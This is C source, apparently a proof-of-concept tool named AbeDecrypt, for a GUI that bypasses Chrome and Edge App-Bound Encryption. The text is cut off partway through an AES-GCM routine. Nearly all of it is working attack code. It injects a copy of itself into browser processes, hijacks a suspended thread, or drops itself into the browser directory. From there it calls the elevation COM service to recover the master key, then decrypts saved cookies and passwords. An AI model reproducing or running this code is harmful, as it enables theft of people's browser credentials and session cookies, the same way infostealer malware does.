/*
 * AbeDecrypt: Chromium App-Bound Encryption bypass PoC (4 methods), GUI edition
 *
 * Browser/Profile/Method combo boxes, cookies & passwords list views and a
 * status control. Browsers and profiles are enumerated via the MLE Browser
 * module (Net\Browser); Local State is parsed via the MLE JSON module.
 *
 * Elevate requires admin (impersonates SYSTEM for the SYSTEM DPAPI layer and,
 * for Chrome's V3 envelope, the CNG unwrap of the cng_block).
 * Drop requires admin for system-level browser installs (write to Program Files).
 * Inject launches the browser when it is not running.
 *
 * The Drop method copies this executable into the browser directory under its
 * own file name; the child copy detects the browser directory, runs the COM
 * payload and writes the key to the inherited stdout pipe.
 */

#define MLE_API
#define _USE_COMMCTL60

#include "../../KNSoft.MakeLifeEasier/MakeLifeEasier.h"

#include <windowsx.h>
#include <commctrl.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <ncrypt.h>
#include <roapi.h>
#include <winsqlite/winsqlite3.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ncrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

/*** constants ***/

#define ABE_KEY_SIZE           32
#define ABE_LOCAL_STATE_MAX    (1 << 20)
#define ABE_POLL_COUNT         2000
#define ABE_POLL_SLACK_MS      15

/* V3 private envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
#define ABE_V3_ENVELOPE_SIZE   93

/* V3 XOR mask, applied to the CNG-decrypted blob; embedded (byte-identical) in the
   Chrome/Edge elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV3Mask[ABE_KEY_SIZE] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
};

typedef enum _ABE_METHOD { MethodDrop, MethodInject, MethodHijack, MethodElevate, MethodMax } ABE_METHOD;

static const PCWSTR AbeMethodNames[MethodMax] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };

/* sample-side data the generic Browser module must not know about */
typedef struct _ABE_BROWSER
{
    PCWSTR Vendor;      /* matches Net_BrowserEnumerate output */
    PCWSTR CngKey;      /* persisted AES key in the SYSTEM profile KSP store (V3) */
    CLSID Clsid;
    IID Iid;
    ULONG DecryptSlot;
} ABE_BROWSER;

static const ABE_BROWSER AbeBrowsers[] = {
    { L"Microsoft\\Edge",  L"Microsoft Edgekey1",
      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
    { L"Google\\Chrome",   L"Google Chromekey1",
      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
};

static const ABE_BROWSER*
AbeFindBrowserEntry(
    _In_z_ PCWSTR Vendor)
{
    ULONG i;

    for (i = 0; i < ARRAYSIZE(AbeBrowsers); i++)
    {
        if (_wcsicmp(AbeBrowsers[i].Vendor, Vendor) == 0) return &AbeBrowsers[i];
    }
    return NULL;
}

/*** GUI globals ***/

#define IDC_BROWSER_COMBO   1001
#define IDC_PROFILE_COMBO   1002
#define IDC_METHOD_COMBO    1003
#define IDC_GO_BUTTON       1004
#define IDC_COOKIE_LIST     1005
#define IDC_PASSWORD_LIST   1006
#define IDC_STATUS_EDIT     1007

static HWND g_MainWindow;
static HFONT g_Font;
static UINT g_Dpi = USER_DEFAULT_SCREEN_DPI;
static PNET_BROWSER_INFO g_Browsers;
static ULONG g_BrowserCount;
static PNET_BROWSER_PROFILE g_Profiles;
static ULONG g_ProfileCount;

/*** worker result ***/

typedef struct _ABE_RECORD
{
    WCHAR Version[8];
    WCHAR Site[256];
    WCHAR Name[160];
    WCHAR Value[2048];
} ABE_RECORD, *PABE_RECORD;

typedef struct _ABE_RESULT
{
    BOOL Ok;
    WCHAR Status[4096];
    PABE_RECORD Cookies;
    ULONG CookieCount;
    PABE_RECORD Passwords;
    ULONG PasswordCount;
} ABE_RESULT, *PABE_RESULT;

/* running log of the worker, also used for the final status text */
static WCHAR g_Log[4096];

static VOID
AbeLog(
    _In_z_ _Printf_format_string_ PCWSTR Format,
    ...)
{
    va_list Args;
    ULONG Length;

    va_start(Args, Format);
    Length = (ULONG)wcslen(g_Log);
    if (Length < ARRAYSIZE(g_Log) - 1)
    {
        Str_VPrintfExW(g_Log + Length, ARRAYSIZE(g_Log) - Length, Format, Args);
    }
    va_end(Args);
}

static BOOL
AbeStrIContainsW(
    _In_z_ PCWSTR Haystack,
    _In_z_ PCWSTR Needle)
{
    ULONG i, j;

    for (i = 0; Haystack[i] != UNICODE_NULL; i++)
    {
        for (j = 0; ; j++)
        {
            if (Needle[j] == UNICODE_NULL) return TRUE;
            if (Haystack[i + j] == UNICODE_NULL) return FALSE;
            if (RtlDowncaseUnicodeChar(Haystack[i + j]) !=
                RtlDowncaseUnicodeChar(Needle[j]))
            {
                break;
            }
        }
    }
    return FALSE;
}

/*** globals shared with the in-browser payload ***/

#pragma data_seg(".abedata")
__declspec(allocate(".abedata"))
static volatile LONG g_Pending = 0;
__declspec(allocate(".abedata"))
static volatile LONG g_Code = (LONG)E_FAIL;
__declspec(allocate(".abedata"))
static volatile BYTE g_Key[ABE_KEY_SIZE];
#pragma data_seg()

/* request block patched into the mapped image before injection */
#pragma data_seg(".abereq")
__declspec(allocate(".abereq"))
static volatile struct
{
    ULONG BrowserIndex;
    ULONG LocalStateLength;
    BYTE LocalState[ABE_LOCAL_STATE_MAX];
} g_Request = { 0 };
#pragma data_seg()

/*** payload: runs inside the browser process (Hijack initial thread / Inject remote thread) ***/

typedef HRESULT (WINAPI *PFN_DECRYPT_DATA)(PVOID, BSTR, BSTR*, DWORD*);

static VOID
AbePayloadWorker(VOID)
{
    static BYTE Blob[2048];
    const ABE_BROWSER* Browser = NULL;
    HRESULT (WINAPI *CoInit)(PVOID, DWORD);
    HRESULT (WINAPI *CoCreate)(const GUID*, PVOID, DWORD, const GUID*, PVOID*);
    HRESULT (WINAPI *CoBlanket)(PVOID, DWORD, DWORD, PCWSTR, DWORD, DWORD, PVOID, DWORD);
    BSTR (WINAPI *SysAllocByteLen)(PCSTR, UINT);
    UINT (WINAPI *SysByteLen)(BSTR);
    VOID (WINAPI *SysFree)(BSTR);
    BOOL (WINAPI *CryptStrToBin)(PCSTR, DWORD, DWORD, PBYTE, DWORD*, DWORD*, DWORD*);
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    DWORD LastError = 0, Base64Length = 0, BlobLength = sizeof(Blob);
    ULONG Index, TagLength = sizeof("\"app_bound_encrypted_key\":\"") - 1;
    PCSTR Base64 = NULL;
    LONG Code = (LONG)E_FAIL;
    HRESULT Hr = E_FAIL;
    BYTE* Text = (BYTE*)g_Request.LocalState;

    /* runs before CRT init: everything must be resolved dynamically */
    if (g_Request.BrowserIndex < ARRAYSIZE(AbeBrowsers))
        Browser = &AbeBrowsers[g_Request.BrowserIndex];

    for (Index = 0; Browser && Index + TagLength <= g_Request.LocalStateLength; Index++)
    {
        if (Text[Index] == '"' &&
            memcmp(Text + Index, "\"app_bound_encrypted_key\":\"", TagLength) == 0)
        {
            Base64 = (PCSTR)Text + Index + TagLength;
            break;
        }
    }
    if (Base64)
    {
        while (Base64Length < 8192 && Base64[Base64Length] != '"') Base64Length++;
    }

    CryptStrToBin = (PVOID)GetProcAddress(LoadLibraryW(L"crypt32.dll"),
                                          "CryptStringToBinaryA");
    if (Base64 && CryptStrToBin &&
        CryptStrToBin(Base64,
                      Base64Length,
                      CRYPT_STRING_BASE64,
                      Blob,
                      &BlobLength,
                      NULL,
                      NULL) &&
        BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0 &&
        (CoInit = (PVOID)GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
        (CoCreate = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
        (CoBlanket = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
        (SysAllocByteLen = (PVOID)GetProcAddress(LoadLibraryW(L"oleaut32.dll"), "SysAllocStringByteLen")) != NULL &&
        (SysByteLen = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysStringByteLen")) != NULL &&
        (SysFree = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
    {
        Hr = CoInit(NULL, COINIT_APARTMENTTHREADED);
        if (SUCCEEDED(Hr))
        {
            Hr = CoCreate(&Browser->Clsid,
                          NULL,
                          CLSCTX_LOCAL_SERVER,
                          &Browser->Iid,
                          &Elevator);
            if (SUCCEEDED(Hr))
            {
                Hr = CoBlanket(Elevator,
                               RPC_C_AUTHN_DEFAULT,
                               RPC_C_AUTHZ_DEFAULT,
                               NULL,
                               RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL,
                               EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(Hr))
                {
                    In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
                    Hr = ((PFN_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                        Elevator,
                        In,
                        &Out,
                        &LastError);
                    if (SUCCEEDED(Hr) && Out && SysByteLen(Out) == ABE_KEY_SIZE)
                    {
                        RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
                        Code = 0;
                    }
                }
            }
        }
    }
    g_Code = Code != 0 ? (LONG)Hr : 0;
    g_Pending = 1;
}

/* Hijack entry: zero-arg, parks until reaped */
static VOID
AbeHijackEntry(VOID)
{
    AbePayloadWorker();
    for (;;)
    {
        Sleep(INFINITE);
    }
}

/* Inject entry: thread-proc signature, returns so the remote thread can exit */
static DWORD WINAPI
AbeInjectEntry(LPVOID Param)
{
    UNREFERENCED_PARAMETER(Param);
    AbePayloadWorker();
    return 0;
}

/*** helpers ***/

/* reads the whole file into a caller buffer */
static NTSTATUS
AbeReadWholeFile(
    _In_ PCWSTR Path,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG Size)
{
    NTSTATUS Status;
    HANDLE File;
    ULONG BytesRead;

    Status = IO_OpenWin32File(&File,
                              Path,
                              NULL,
                              FILE_READ_DATA | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }
    Status = IO_ReadFile(File, NULL, Buffer, BufferSize, &BytesRead);
    NtClose(File);
    if (NT_SUCCESS(Status) && Size != NULL)
    {
        *Size = BytesRead;
    }
    return Status;
}

/* reads os_crypt.<Field> as base64 and decodes it into Blob (APPB/DPAPI prefix kept) */
static BOOL
AbeReadOsCryptBlob(
    _In_z_ PCWSTR UserDataDir,
    _In_z_ PCWSTR Field,
    _Out_writes_bytes_(BlobSize) PBYTE Blob,
    _In_ ULONG BlobSize,
    _Inout_ PDWORD BlobLength)
{
    IJsonValue* Root = NULL;
    IJsonObject* RootObject = NULL, * OsCrypt = NULL;
    HSTRING Value = NULL;
    HSTRING_HEADER KeyHeader, FieldHeader;
    HSTRING Key, FieldStr;
    WCHAR LocalState[MAX_PATH];
    CHAR Base64[2048];
    PCWSTR Wide;
    BOOL Ok = FALSE;

    Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", UserDataDir);
    if (FAILED(Data_JsonParseUtf8File(LocalState, ABE_LOCAL_STATE_MAX, &Root)) ||
        FAILED(Root->lpVtbl->GetObject(Root, &RootObject)) ||
        FAILED(_Inline_WindowsCreateStringReference(L"os_crypt",
                                                    ARRAYSIZE(L"os_crypt") - 1,
                                                    &KeyHeader,
                                                    &Key)) ||
        FAILED(RootObject->lpVtbl->GetNamedObject(RootObject, Key, &OsCrypt)) ||
        FAILED(_Inline_WindowsCreateStringReference(Field,
                                                    (ULONG)(Str_SizeW(Field) / sizeof(WCHAR)),
                                                    &FieldHeader,
                                                    &FieldStr)) ||
        FAILED(OsCrypt->lpVtbl->GetNamedString(OsCrypt, FieldStr, &Value)))
    {
        goto Cleanup;
    }
    Wide = _Inline_WindowsGetStringRawBuffer(Value, NULL);
    if (Str_W2A(Base64, Wide) != 0 &&
        CryptStringToBinaryA(Base64,
                             0,
                             CRYPT_STRING_BASE64,
                             Blob,
                             BlobLength,
                             NULL,
                             NULL))
    {
        Ok = TRUE;
    }

Cleanup:
    if (Value != NULL) _Inline_WindowsDeleteString(Value);
    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
    if (Root != NULL) Root->lpVtbl->Release(Root);
    return Ok;
}

static BOOL
AbePrepareRequest(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex)
{
    PVOID Text;
    ULONG TextLength = 0;
    WCHAR LocalState[MAX_PATH];
    BOOL Ok = FALSE;

    /* the payload scans the raw JSON text; hand it the Local State contents */
    Text = Mem_Alloc(ABE_LOCAL_STATE_MAX);
    if (Text == NULL) return FALSE;
    Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", Browser->UserDataDir);
    if (NT_SUCCESS(AbeReadWholeFile(LocalState, Text, ABE_LOCAL_STATE_MAX, &TextLength)) &&
        TextLength < ABE_LOCAL_STATE_MAX)
    {
        RtlCopyMemory((PVOID)g_Request.LocalState, Text, TextLength);
        g_Request.BrowserIndex = BrowserIndex;
        g_Request.LocalStateLength = TextLength;
        Ok = TRUE;
    }
    Mem_Free(Text);
    return Ok;
}

/*** self-map: stage a relocated copy of our image into the target ***/

static BOOL
AbeMapSelf(
    _In_ HANDLE Process,
    _Out_ PVOID* Mapped)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    IMAGE_NT_HEADERS* Nt = RtlImageNtHeader((PVOID)Self);
    IMAGE_BASE_RELOCATION* Reloc;
    PUSHORT Entry;
    PBYTE Copy = NULL;
    PVOID Remote = NULL;
    SIZE_T Size, Count, i, RegionSize;
    ULONG64 Delta;
    ULONG Remaining, BlockSize;
    BOOL Ok = FALSE;

    *Mapped = NULL;
    if (Nt == NULL)
    {
        return FALSE;
    }
    Size = Nt->OptionalHeader.SizeOfImage;
    RegionSize = Size;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(),
                                            (PVOID*)&Copy,
                                            0,
                                            &RegionSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE)) ||
        !NT_SUCCESS(NtAllocateVirtualMemory(Process,
                                            &Remote,
                                            0,
                                            &RegionSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_EXECUTE_READWRITE)))
    {
        goto Cleanup;
    }

    RtlCopyMemory(Copy, Self, Size);
    Delta = (ULONG64)(ULONG_PTR)Remote - (ULONG64)(ULONG_PTR)Self;
    if (Delta != 0)
    {
        Reloc = (IMAGE_BASE_RELOCATION*)(Copy +
            Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        Remaining = Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while (Remaining >= sizeof(*Reloc))
        {
            BlockSize = Reloc->SizeOfBlock;
            Count = (BlockSize - sizeof(*Reloc)) / sizeof(USHORT);
            Entry = (PUSHORT)(Reloc + 1);
            for (i = 0; i < Count; i++)
            {
                if ((Entry[i] >> 12) == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG64*)(Copy + Reloc->VirtualAddress + (Entry[i] & 0xFFF)) += Delta;
                }
            }
            Remaining -= BlockSize;
            Reloc = (IMAGE_BASE_RELOCATION*)((PBYTE)Reloc + BlockSize);
        }
    }
    if (!NT_SUCCESS(NtWriteVirtualMemory(Process, Remote, Copy, Size, NULL)))
    {
        goto Cleanup;
    }
    NtFlushInstructionCache(Process, Remote, Size);
    *Mapped = Remote;
    Ok = TRUE;

Cleanup:
    if (Copy != NULL) NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Copy, &RegionSize, MEM_RELEASE);
    if (!Ok && Remote != NULL)
    {
        RegionSize = 0;
        NtFreeVirtualMemory(Process, &Remote, &RegionSize, MEM_RELEASE);
    }
    return Ok;
}

/* polls g_Pending in the mapped copy, then copies out g_Code/g_Key */
static LONG
AbeWaitRemoteResult(
    _In_ HANDLE Process,
    _In_opt_ HANDLE WaitObject,
    _In_ PVOID Mapped,
    _In_ PVOID SelfBase,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    ULONG64 Delta = (ULONG64)(ULONG_PTR)Mapped - (ULONG64)(ULONG_PTR)SelfBase;
    PBYTE RemotePending = (PBYTE)((ULONG64)(ULONG_PTR)&g_Pending + Delta);
    PBYTE RemoteCode = (PBYTE)((ULONG64)(ULONG_PTR)&g_Code + Delta);
    PBYTE RemoteKey = (PBYTE)((ULONG64)(ULONG_PTR)g_Key + Delta);
    LONG Pending = 0, Code = (LONG)E_FAIL;
    LARGE_INTEGER Timeout;
    ULONG Polls;

    Timeout.QuadPart = -(LONGLONG)ABE_POLL_SLACK_MS * 10000;
    for (Polls = 0; Polls < ABE_POLL_COUNT; Polls++)
    {
        if (NT_SUCCESS(NtReadVirtualMemory(Process,
                                           RemotePending,
                                           &Pending,
                                           sizeof(Pending),
                                           NULL)) && Pending != 0)
        {
            break;
        }
        if (WaitObject != NULL &&
            NtWaitForSingleObject(WaitObject, FALSE, &Timeout) == STATUS_WAIT_0)
        {
            break;
        }
    }
    NtReadVirtualMemory(Process,
                        RemoteCode,
                        &Code,
                        sizeof(Code),
                        NULL);
    if (Code == 0)
    {
        NtReadVirtualMemory(Process,
                            RemoteKey,
                            Key,
                            ABE_KEY_SIZE,
                            NULL);
    }
    return Code;
}

/*** method: Hijack (suspended browser initial thread redirected to our payload) ***/

static BOOL
AbeGetKeyHijack(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = GetModuleHandleW(NULL);
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    CONTEXT Ctx = { 0 };
    PVOID Mapped = NULL;
    LONG Code = (LONG)E_FAIL;

    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;

    ZeroMemory(&Si, sizeof(Si));
    ZeroMemory(&Pi, sizeof(Pi));
    Si.cb = sizeof(Si);
    if (!CreateProcessW(Browser->ExePath,
                        NULL,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_SUSPENDED,
                        NULL,
                        NULL,
                        &Si,
                        &Pi))
    {
        AbeLog(L"Hijack：创建浏览器进程失败，gle=%lu\r\n", GetLastError());
        return FALSE;
    }

    if (AbeMapSelf(Pi.hProcess, &Mapped))
    {
        Ctx.ContextFlags = CONTEXT_CONTROL;
        if (NT_SUCCESS(NtGetContextThread(Pi.hThread, &Ctx)))
        {
            Ctx.Rip = (DWORD64)(ULONG_PTR)Mapped +
                      ((ULONG64)(ULONG_PTR)AbeHijackEntry - (ULONG64)(ULONG_PTR)Self);
            if (NT_SUCCESS(NtSetContextThread(Pi.hThread, &Ctx)))
            {
                NtResumeThread(Pi.hThread, NULL);
                Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
            }
        }
    }
    if (Code != 0)
    {
        AbeLog(L"Hijack：payload 失败，hr=0x%08lX\r\n", (unsigned long)Code);
    }

    NtTerminateProcess(Pi.hProcess, 0);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    return Code == 0;
}

/*** method: Inject (target the running browser process, launch it if needed) ***/

static ULONG
AbeFindProcessIdByName(
    _In_z_ PCWSTR Name)
{
    UNICODE_STRING Target;
    PSYSTEM_PROCESS_INFORMATION Process, Entry;
    ULONG Length = 0x400000, Pid = 0;
    NTSTATUS Status;

    RtlInitUnicodeString(&Target, Name);
    Process = NULL;
    for (;;)
    {
        Process = Mem_ReAlloc(Process, Length);
        if (Process == NULL) return 0;
        Status = NtQuerySystemInformation(SystemProcessInformation, Process, Length, &Length);
        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
            Status != STATUS_BUFFER_TOO_SMALL)
        {
            break;
        }
        if (Length > 64 * 1024 * 1024)
        {
            Mem_Free(Process);
            return 0;
        }
        Length *= 2;
    }
    if (NT_SUCCESS(Status))
    {
        Entry = Process;
        for (;;)
        {
            if (Entry->ImageName.Buffer != NULL &&
                RtlEqualUnicodeString(&Entry->ImageName, &Target, TRUE))
            {
                Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
                break;
            }
            if (Entry->NextEntryOffset == 0) break;
            Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
        }
    }
    Mem_Free(Process);
    return Pid;
}

static BOOL
AbeGetKeyInject(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = GetModuleHandleW(NULL);
    PVOID Mapped = NULL;
    HANDLE Process = NULL, Thread = NULL;
    SIZE_T RegionSize = 0;
    LONG Code = (LONG)E_FAIL;
    ULONG Pid, Polls;
    NTSTATUS Status;

    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;

    Pid = AbeFindProcessIdByName(Browser->ExeName);
    if (Pid == 0)
    {
        /* not running: launch it so we have a live process to inject into */
        STARTUPINFOW Si;
        PROCESS_INFORMATION Pi;

        ZeroMemory(&Si, sizeof(Si));
        ZeroMemory(&Pi, sizeof(Pi));
        Si.cb = sizeof(Si);
        if (!CreateProcessW(Browser->ExePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi))
        {
            AbeLog(L"Inject：创建浏览器进程失败，gle=%lu\r\n", GetLastError());
            return FALSE;
        }
        NtClose(Pi.hThread);
        NtClose(Pi.hProcess);
        for (Polls = 0; Polls < 50; Polls++)
        {
            Pid = AbeFindProcessIdByName(Browser->ExeName);
            if (Pid != 0) break;
            Sleep(200);
        }
        AbeLog(L"Inject：已启动 %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
    }
    if (Pid == 0)
    {
        AbeLog(L"Inject：找不到运行中的 %ls\r\n", Browser->ExeName);
        return FALSE;
    }
    Status = PS_OpenProcess(&Process,
                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_READ,
                            Pid);
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"Inject：OpenProcess(%lu) 失败，0x%08lX\r\n", Pid, Status);
        return FALSE;
    }

    if (AbeMapSelf(Process, &Mapped) &&
        NT_SUCCESS(PS_CreateThread(Process,
                                   FALSE,
                                   (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
                                       ((ULONG64)(ULONG_PTR)AbeInjectEntry - (ULONG64)(ULONG_PTR)Self)),
                                   NULL,
                                   &Thread,
                                   NULL)))
    {
        Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
    }
    if (Code != 0)
    {
        AbeLog(L"Inject：payload 失败，hr=0x%08lX\r\n", (unsigned long)Code);
    }

    /* do NOT terminate the user's browser; the remote thread exits on its own */
    if (Thread != NULL) NtClose(Thread);
    if (Mapped != NULL) NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
    NtClose(Process);
    return Code == 0;
}

/*** method: Drop (copy self into the browser dir so COM path validation passes) ***/

/* Drop child: runs from the browser directory, writes the key to the stdout pipe */
static BOOL
AbeDropChild(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex)
{
    CHAR Line[128];
    HANDLE StdOut;
    DWORD Written;
    ULONG i, Offset;

    RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
    g_Pending = 0;
    g_Code = (LONG)E_FAIL;
    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
    AbePayloadWorker();
    if (g_Code != 0) return FALSE;

    Offset = Str_PrintfExA(Line, sizeof(Line), "KEY=");
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Offset += Str_PrintfExA(Line + Offset, sizeof(Line) - Offset, "%02X", g_Key[i]);
    }
    Str_PrintfExA(Line + Offset, sizeof(Line) - Offset, "\n");
    StdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    return StdOut != NULL && StdOut != INVALID_HANDLE_VALUE &&
           WriteFile(StdOut, Line, (DWORD)strlen(Line), &Written, NULL);
}

static BOOL
AbeGetKeyDrop(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    WCHAR Self[MAX_PATH], Copy[MAX_PATH], Cmd[MAX_PATH * 2], Dir[MAX_PATH];
    SECURITY_ATTRIBUTES Sa;
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    HANDLE ReadPipe = NULL, WritePipe = NULL;
    static CHAR Buffer[4096];
    CHAR* Line;
    DWORD Read, Total = 0;
    ULONG i, Length;

    /* the child copy runs with the same executable name as ours */
    GetModuleFileNameW(NULL, Self, MAX_PATH);
    Length = (ULONG)(wcsrchr(Browser->ExePath, L'\\') - Browser->ExePath);
    RtlCopyMemory(Dir, Browser->ExePath, Length * sizeof(WCHAR));
    Dir[Length] = UNICODE_NULL;
    Str_PrintfExW(Copy, MAX_PATH, L"%ls\\%ls", Dir, wcsrchr(Self, L'\\') + 1);
    if (_wcsicmp(Self, Copy) != 0 && !CopyFileW(Self, Copy, FALSE))
    {
        AbeLog(L"Drop：复制到浏览器目录失败，gle=%lu（需要管理员？）\r\n", GetLastError());
        return FALSE;
    }

    Sa.nLength = sizeof(Sa);
    Sa.bInheritHandle = TRUE;
    Sa.lpSecurityDescriptor = NULL;
    CreatePipe(&ReadPipe, &WritePipe, &Sa, 0);
    SetHandleInformation(ReadPipe, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESTDHANDLES;
    Si.hStdOutput = WritePipe;
    Si.hStdError = WritePipe;
    Str_PrintfExW(Cmd, MAX_PATH * 2, L"\"%ls\" Drop", Copy);
    if (!CreateProcessW(NULL, Cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi))
    {
        AbeLog(L"Drop：创建子进程失败，gle=%lu\r\n", GetLastError());
        CloseHandle(ReadPipe);
        CloseHandle(WritePipe);
        if (_wcsicmp(Self, Copy) != 0) DeleteFileW(Copy);
        return FALSE;
    }
    CloseHandle(WritePipe);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);

    while (Total < sizeof(Buffer) - 1 &&
           ReadFile(ReadPipe, Buffer + Total, (DWORD)(sizeof(Buffer) - 1 - Total), &Read, NULL) &&
           Read != 0)
    {
        Total += Read;
    }
    CloseHandle(ReadPipe);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    if (_wcsicmp(Self, Copy) != 0) DeleteFileW(Copy);

    /* locate "KEY=" byte-wise: the stream may embed NUL terminators */
    for (i = 0; i + 4 + ABE_KEY_SIZE * 2 <= Total; i++)
    {
        if (Buffer[i] == 'K' && Buffer[i + 1] == 'E' &&
            Buffer[i + 2] == 'Y' && Buffer[i + 3] == '=')
        {
            break;
        }
    }
    if (i + 4 + ABE_KEY_SIZE * 2 > Total)
    {
        AbeLog(L"Drop：子进程输出中没有密钥\r\n");
        return FALSE;
    }
    Line = Buffer + i + 4;
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        INT Hi = Line[i * 2] <= '9' ? Line[i * 2] - '0' : Line[i * 2] - 'A' + 10;
        INT Lo = Line[i * 2 + 1] <= '9' ? Line[i * 2 + 1] - '0' : Line[i * 2 + 1] - 'A' + 10;

        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15) return FALSE;
        Key[i] = (BYTE)((Hi << 4) | Lo);
    }
    return TRUE;
}

/*** AES-256-GCM open (no AAD) ***/

static BOOL
AbeAesGcmOpen(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(12) const BYTE* Nonce,
    _In_reads_bytes_(Length) const BYTE* CipherText,
    _In_ DWORD Length,
    _In_reads_bytes_(16) const BYTE* Tag,
    _Out_writes_bytes_(Length) PBYTE Plain)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Auth;
    BCRYPT_ALG_HANDLE Alg = NULL;
    BCRYPT_KEY_HANDLE Cipher = NULL;
    static BYTE Object[4096];
    ULONG ObjLen = 0, Done = 0, Result = 0;
    NTSTATUS St;

    St = BCryptOpenAlgorithmProvider(&Alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(St)) return FALSE;
    BCryptSetProperty(Alg,
                      BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
